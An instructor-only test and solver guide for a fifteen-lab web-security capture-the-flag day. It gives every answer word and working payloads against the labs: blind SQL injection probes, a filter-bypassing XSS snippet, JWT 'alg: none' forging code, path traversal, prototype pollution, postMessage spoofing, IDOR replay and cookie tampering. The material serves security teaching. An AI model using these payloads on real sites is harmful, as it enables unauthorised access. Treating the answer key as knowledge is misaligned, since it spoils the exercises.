# Day 7 — Web Applications: Full Test & Solver Guide

> **Instructor / tester only.** Do not share with students.  
> Use this to walk every Day 7 lab and confirm it still works end-to-end.  
> Site: `https://ctf-two-alpha.vercel.app` · Day code: **`WEB-2026`** · Pack **v2.4**

---

## Quick checklist

| # | Title | Level | Route | Expected answer | Pass if… |
|---|-------|-------|-------|-----------------|----------|
| 1 | Markup Trail | Easy | `/challenge/markup-trail` | `ink_below` | Answer box accepts |
| 2 | Side Door | Easy | `/challenge/side-door` | `service_hatch` | Hatch shows code |
| 3 | Desk Wizard | Easy | `/challenge/desk-wizard` | `quiet_path` | sessionStorage holds b64 |
| 4 | Role Chip | Medium | `/challenge/role-chip` | `analyst_seat` | Cabinet OPEN |
| 5 | Twin Check | Medium | `/challenge/twin-check` | `both_match` | Unlock shows token |
| 6 | Leaky Desk | Medium | `/challenge/leaky-desk` | `desk_owner_note` | Desk 2701 memo |
| 7 | Frame Whisper | Medium | `/challenge/frame-whisper` | `posted_secret` | Console catches note |
| 8 | Safe Shelf | Medium | `/challenge/safe-shelf` | `shelf_escape_ok` | Secret file body |
| 9 | Stash Order | Medium | `/challenge/stash-order` | `abc_order` | Vault open |
| 10 | Quiet Directory | Hard | `/challenge/quiet-directory` | `w7blindx` | Blind extract works |
| 11 | Strict Guestbook | Hard | `/challenge/strict-guestbook` | `strict_spill` | XSS dumps vault |
| 12 | Claim Ticket | Hard | `/challenge/claim-ticket` | `forged_pass` | Vault open |
| 13 | Inherited Trust | Danger | `/challenge/inherited-trust` | `chief_clearance` | Chief seat |
| 14 | Cross Talk | Danger | `/challenge/cross-talk` | `null_origin_ok` | Elevate accepted |
| 15 | Flash Seat | Danger | `/challenge/flash-seat` | `race_won` | Seat claimed |

**How to submit:** each page has an Answer box. Dynamic flags wrap the recovery word — submit the **recovery word** above (platform builds `KGSP{…}` for you). If verify fails, you are logged out / day locked / typo.

**Before testing:** log in as a player, unlock Day 7 with code `WEB-2026`, open DevTools (F12) → Console + Application + Network.

---

# Easy

## 1 · Markup Trail

**Route:** `/challenge/markup-trail`  
**Answer:** `ink_below`

### Steps
1. Open the challenge.
2. Right-click the “empty” desk card → **Inspect**.
3. Find the two hidden tags:
   - `<i data-k="ink" …>`
   - `<i data-k="_bel" …>`
4. In the same block, find the HTML comment: `<!-- ow -->`
5. Concatenate: `ink` + `_bel` + `ow` → **`ink_below`**
6. Submit in the Answer box.

### Pass / fail
- **Pass:** verify succeeds.  
- **Fail:** wrong order, missed comment, typed spaces.

---

## 2 · Side Door

**Route:** `/challenge/side-door`  
**Answer:** `service_hatch`

### Steps
1. Open `/challenge/side-door` (the lobby). Stay on this page ≥1 second.
2. Application → Cookies → confirm `d7_desk_visit=1` was set.
3. Manually go to: **`/challenge/side-door/hatch`**  
   (type in the address bar, or paste on the same origin).
4. Page should show green recovery: **`service_hatch`**
5. Submit that word.

### Pass / fail
- **Pass:** hatch unlocked + verify OK.  
- **Fail:** open hatch in a fresh profile/incognito without visiting lobby first → “No visit mark”. Visit lobby, then hatch again.

---

## 3 · Desk Wizard

**Route:** `/challenge/desk-wizard`  
**Answer:** `quiet_path`

### Steps
1. Open the wizard. Choose in order:
   1. **Walk-in**
   2. **Quiet-room access**
   3. **Nobody — keep it internal**
2. UI says a recovery slip was filed (not shown on the card).
3. Application → Session Storage → key **`d7_desk_recovery`**
4. Value is base64. In Console:
   ```js
   atob(sessionStorage.getItem('d7_desk_recovery'))
   ```
5. You get **`quiet_path`**. Submit it.

### Pass / fail
- **Pass:** decode matches `quiet_path`.  
- **Fail:** wrong choices → “No recovery was filed”; Restart intake and pick the three correct options.

---

# Medium

## 4 · Role Chip

**Route:** `/challenge/role-chip`  
**Answer:** `analyst_seat`

### Steps
1. Open the page. Role reading should show `guest`. Cookie name: **`d7_role`**.
2. Cookie value is base64 JSON. Decode:
   ```js
   JSON.parse(atob(document.cookie.match(/d7_role=([^;]*)/)[1]))
   ```
3. Change role to **`analyst`** and write the cookie back:
   ```js
   document.cookie = 'd7_role=' + btoa(JSON.stringify({role:'analyst',desk:'front',v:1})) + '; path=/; SameSite=Lax';
   ```
4. Wait ~1s. Cabinet should flip to **OPEN** and show **`analyst_seat`**.
5. Submit.

### Pass / fail
- **Pass:** cabinet shows token.  
- **Fail:** still LOCKED → cookie not updated / wrong role string / not logged in (live material missing).

---

## 5 · Twin Check

**Route:** `/challenge/twin-check`  
**Answer:** `both_match`

### Steps
1. Open the page. A cookie **`d7_pair`** is planted (random hex).
2. Application → Cookies → copy the value of `d7_pair`.  
   Or Console:
   ```js
   document.cookie.match(/d7_pair=([^;]*)/)[1]
   ```
3. Paste that **exact** value into “Desk confirmation”.
4. Click **Check twins**.
5. Token **`both_match`** appears. Submit.

### Pass / fail
- **Pass:** unlock shows token.  
- **Fail:** typo / extra spaces / cookie changed mid-test.

---

## 6 · Leaky Desk (IDOR)

**Route:** `/challenge/leaky-desk`  
**Answer:** `desk_owner_note`

### Steps
1. Click **View My Profile Data**. JSON for desk **4188** appears.
2. Note field **`badge_issuer`: `2701`**.
3. Open Network, find the RPC call `d7_leaky_user` (or use Console). Replay with desk **2701**.

   Console (while logged in on the challenge page):
   ```js
   // easiest: edit the button call via Network → Replay, change p_desk_id to 2701
   // or from App context if you prefer Network copy-as-fetch
   ```

   Practical Network method:
   1. Network → click the existing `d7_leaky_user` request.
   2. Copy as fetch / edit payload: set `"p_desk_id": 2701`.
   3. Send again.

4. Response for 2701 includes **`internal_memo`: `desk_owner_note`**.
5. Submit **`desk_owner_note`**.

### Pass / fail
- **Pass:** memo field present on 2701.  
- **Fail:** only 4188 loaded; random ids return “No desk with that id.”

---

## 7 · Frame Whisper

**Route:** `/challenge/frame-whisper`  
**Answer:** `posted_secret`

### Steps
1. Open the page. A sandboxed iframe loads.
2. In Console, listen **before** reload (or reload after installing listener):
   ```js
   window.addEventListener('message', e => console.log('MSG', e.data));
   ```
3. Reload the challenge page (listener must be active when the iframe posts ~600ms later).
4. You should see something like: `{channel:'desk-widget', note:'posted_secret'}`.
5. Submit **`posted_secret`**.

### Pass / fail
- **Pass:** note equals `posted_secret`.  
- **Fail:** listener added too late — reload after installing it.

---

## 8 · Safe Shelf (path traversal)

**Route:** `/challenge/safe-shelf`  
**Answer:** `shelf_escape_ok`

### Steps
1. Open a public guide (e.g. Terms). Read the hint text: internal notes live **one shelf above** the guides cabinet.
2. In the `file=` field type:
   ```
   ../secrets/desk_note.txt
   ```
3. Click **Open guide** (or press Enter).
4. Body shows recovery: **`shelf_escape_ok`**.
5. Submit.

### Pass / fail
- **Pass:** secret file body + verify OK.  
- **Fail:** absolute paths denied; wrong relative path → “No document”.

---

## 9 · Stash Order

**Route:** `/challenge/stash-order`  
**Answer:** `abc_order`

### Steps
1. Open Network tab, filter `collect` or `desk-drawers`.
2. Click **Request floor plan**. Three requests fire (out of order) with `seg=alpha|beta|gamma` and `seq=1|2|3`.
3. Map by **seq**:
   - seq=1 → `alpha`
   - seq=2 → `beta`
   - seq=3 → `gamma`
4. Write lasting storage (page prints the key names):
   ```js
   localStorage.setItem('d7_stash_a', 'alpha');
   localStorage.setItem('d7_stash_b', 'beta');
   localStorage.setItem('d7_stash_c', 'gamma');
   ```
5. Click **Open vault** → **`abc_order`**. Submit.

### Pass / fail
- **Pass:** vault open.  
- **Fail:** wrong order / Wipe stash then redo.

---

# Hard

## 10 · Quiet Directory (blind boolean)

**Route:** `/challenge/quiet-directory`  
**Answer:** `w7blindx` (8 chars)

### How it works
Lookup returns only:
- **User exists.** → condition true  
- **User not found.** → condition false  

Plain usernames `admin` / `guest` / `custodian` exist (sanity check).

### Steps — length
```
admin' AND LENGTH(flag)=8 --
```
→ User exists. (confirm length 8)

### Steps — character by character
For position `i` and guess `c`:
```
admin' AND SUBSTRING(flag,1,1)='w' --
admin' AND SUBSTRING(flag,2,1)='7' --
admin' AND SUBSTRING(flag,3,1)='b' --
…
```
True → keep; False → try next char.

Full expected word: **`w7blindx`**

### Optional — ASCII binary search
```
admin' AND ASCII(SUBSTRING(flag,1,1))>100 --
```

### Optional — prefix
```
admin' AND flag LIKE 'w7%' --
```

### Console helper (paste on the challenge page)
```js
// Manual: type payloads in the search box, or automate:
const charset = 'abcdefghijklmnopqrstuvwxyz0123456789_';
async function probe(q) {
  // Use the UI Lookup, or call via your session — easiest is UI loop
  console.log('Try in the box:', q);
}
for (let i = 1; i <= 8; i++) {
  for (const c of charset) {
    console.log(`pos ${i} try ${c}:`, `admin' AND SUBSTRING(flag,${i},1)='${c}' --`);
  }
}
```
(Tester shortcut: you already know the answer — just confirm a few true/false probes, then submit `w7blindx`.)

### Pass / fail
- **Pass:** correct char probes flip exists/not-found; final submit OK.  
- **Fail:** day locked; unsupported payload always “not found” (still no SQL error — expected).

---

## 11 · Strict Guestbook (filtered XSS)

**Route:** `/challenge/strict-guestbook`  
**Answer:** `strict_spill`

### How it works
- Scrubber blocks `script`, `javascript:`, and common hooks: `onerror`, `onload`, `onclick`, `onmouseover`, …
- After load, vault is decrypted into **`window.__D7_STRICT`** (not shown on screen).
- You must make the preview HTML **read that property**.

### Steps
1. Open the page (stay logged in so vault loads).
2. Paste into the note box:

```html
<div style="animation:x 1s" onanimationend="document.body.append(window.__D7_STRICT)">x</div>
<style>@keyframes x{from{opacity:1}to{opacity:1}}</style>
```

3. Click **Post note**.
4. Preview should print **`strict_spill`**.
5. Submit.

### Alternate payloads
```html
<span onpointerdown="document.body.append(window.__D7_STRICT)">click me</span>
```
(then click the preview text)

### Pass / fail
- **Pass:** vault text appears in preview.  
- **Fail:** `onerror` / `onload` get scrubbed (`data-blocked`). Wait a moment after page load so `__D7_STRICT` exists before posting.

---

## 12 · Claim Ticket (`alg: none`)

**Route:** `/challenge/claim-ticket`  
**Answer:** `forged_pass`

### Steps
1. Click **Issue guest ticket**. Cookie **`d7_claim`** = `header.payload.sig` (three base64url parts).
2. In Console, forge admin + alg none:

```js
function b64url(obj) {
  return btoa(JSON.stringify(obj)).replace(/\+/g,'-').replace(/\//g,'_').replace(/=+$/g,'');
}
const header = b64url({alg:'none', typ:'DESK'});
const payload = b64url({role:'admin', desk:'front'});
const forged = header + '.' + payload + '.';
document.cookie = 'd7_claim=' + forged + '; path=/; SameSite=Lax';
console.log(forged);
```

3. Click **Open vault with cookie**.
4. Token **`forged_pass`** appears. Submit.

### Pass / fail
- **Pass:** vault open with forged cookie.  
- **Fail:** `role=guest` still sealed; bad signature if you keep HS256 without fixing alg to `none`.

---

# Danger (multi-step)

## 13 · Inherited Trust (2-stage prototype pollution)

**Route:** `/challenge/inherited-trust`  
**Answer:** `chief_clearance`

### Steps
1. Merge once with chief seat only:

```json
{"constructor":{"prototype":{"deskRole":"chief"}}}
```

2. Chief console appears with desk seal **`R7-SEAL`**.
3. Merge again with **both** inherited marks:

```json
{"constructor":{"prototype":{"deskRole":"chief","deskSeal":"R7-SEAL"}}}
```

4. Vault opens → **`chief_clearance`**. Submit.

### Pass / fail
- **Pass:** two merges; vault token shown.  
- **Fail:** `__proto__` blocked; one-field merge only unlocks stage 2; seal typo.

---

## 14 · Cross Talk (elevate → gate → confirm)

**Route:** `/challenge/cross-talk`  
**Answer:** `null_origin_ok`

### Steps
1. Load widget (sandbox **without** `allow-same-origin`):

```html
<script>parent.postMessage({elevate:true}, '*');</script>
```

2. Parent shows **Channel open** + desk gate **`n0rigin`**.
3. Load a second widget that confirms:

```html
<script>parent.postMessage({confirm:true, gate:'n0rigin'}, '*');</script>
```

4. Status: **elevate confirmed**. Token **`null_origin_ok`**. Submit.

### Pass / fail
- **Pass:** elevate then confirm with matching gate from null origin.  
- **Fail:** confirm before elevate; wrong gate; same-origin posts ignored.

---

## 15 · Flash Seat (arm → reserve → race)

**Route:** `/challenge/flash-seat`  
**Answer:** `race_won`

### How it works
1. **Arm desk** → cookie `d7_flash_arm=1`
2. **Reserve** as `guest` → one-shot `sessionStorage` ticket
3. Flip `localStorage d7_flash_role` → `admin` and **Confirm** within **450ms** with ticket intact

### Steps
```js
localStorage.setItem('d7_flash_role', 'guest');
const buttons = [...document.querySelectorAll('button')];
const arm = buttons.find(b => /Arm desk/.test(b.textContent));
const reserve = buttons.find(b => /Reserve/.test(b.textContent));
const confirm = buttons.find(b => /Confirm/.test(b.textContent));
arm.click();
reserve.click();
localStorage.setItem('d7_flash_role', 'admin');
confirm.click();
```

→ **`race_won`**. Submit.

### Pass / fail
- **Pass:** armed + guest reserve + admin confirm ≤450ms + ticket ok.  
- **Fail:** reserve without arm; reserved as admin; window missed; ticket wiped.

---

# Tester notes

| Topic | Detail |
|-------|--------|
| Day code | `WEB-2026` |
| Flag model | Dynamic — submit the recovery **word**, not a homemade `KGSP{…}` |
| Blind secret | Server-only (`challenge_answer_keys`); never in the SPA bundle |
| Strict vault | Network shows `reveal_hex` only; plaintext lives in `window.__D7_STRICT` after decrypt |
| Danger v2 | Multi-step: pollution×2, elevate→confirm, arm→reserve→race (450ms) |
| No download files | Entire day is live browser labs |
| Arena order | Easy → Medium → Hard → Danger (`sort_order` 701–715) |

### If verify fails but the lab showed the token
1. Confirm you are still logged in.  
2. Confirm Day 7 is open.  
3. Submit the **exact** recovery word (lowercase, underscores).  
4. Do not wrap it in `KGSP{}` unless the UI asks for a full flag (it usually wants the word).

### Related files
- Short answer map: this file’s checklist (top)  
- Migrations: `supabase/migrations/20260713_*.sql`  
- Pages: `src/pages/day7/*`
